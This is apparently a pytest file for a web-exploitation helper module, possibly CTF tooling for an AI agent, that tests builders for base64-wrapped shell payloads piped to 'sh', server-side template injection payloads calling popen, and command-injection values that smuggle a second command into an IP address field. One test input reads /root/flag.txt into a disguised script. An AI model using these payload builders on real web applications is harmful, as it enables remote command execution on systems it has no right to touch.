import base64

from grin.tools.webexec import wrapped_cmd, ssti_payload, cmdi_value, build_query, SSTI_GADGETS


def test_wrapped_cmd_base64_roundtrips():
    # The whole script is base64'd so an arbitrary multi-step payload survives transport once the
    # query is URL-encoded — this is what the LLM kept getting wrong by hand.
    w = wrapped_cmd("echo /bin/cat /root/flag.txt > /tmp/uptime; chmod 755 /tmp/uptime; syscheck")
    assert w.startswith("echo ") and "| base64 -d | sh" in w
    b64 = w.split()[1]
    assert base64.b64decode(b64).decode().endswith("syscheck")


def test_ssti_payload_wraps_gadget():
    p = ssti_payload("id", SSTI_GADGETS[0])
    assert p.startswith("{{") and p.endswith("}}")
    assert "popen(" in p and "base64 -d | sh" in p


def test_cmdi_value_each_separator():
    assert cmdi_value("127.0.0.1", "id", ";").startswith("127.0.0.1;echo ")
    assert cmdi_value("127.0.0.1", "id", "|").startswith("127.0.0.1|echo ")
    assert cmdi_value("127.0.0.1", "id", "&&").startswith("127.0.0.1&&echo ")
    sub = cmdi_value("127.0.0.1", "id", "$()")
    assert sub.startswith("127.0.0.1$(echo ") and sub.endswith(")")


def test_build_query_percent_encodes_everything():
    # The killer bug class: '+' in base64 becomes a space in a raw query. build_query must
    # percent-encode the whole value so '+', '/', '=', spaces, pipes, braces all survive.
    payload = ssti_payload("id", SSTI_GADGETS[0])
    q = build_query("name", payload)
    assert q.startswith("name=")
    assert " " not in q and "+" not in q.split("=", 1)[1]   # no raw space/plus in the value
    assert "%" in q                                          # it IS percent-encoded
